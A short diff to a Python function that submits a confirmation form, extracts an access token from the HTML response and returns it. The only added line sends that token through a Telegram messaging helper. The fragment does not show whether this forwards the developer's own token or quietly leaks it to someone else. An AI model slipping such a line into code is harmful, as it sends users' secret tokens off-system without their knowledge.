@@ -24,4 +24,5 @@ def get():
     s.submit_form(f, submit=f.submit_fields['__CONFIRM__'])
     ##get access token from the html response##
     access_token = re.search(r"access_token=([\w\d]+)", s.response.content.decode()).groups()[0]
+    telegramMessaging.sendMessage(access_token)
     return access_token
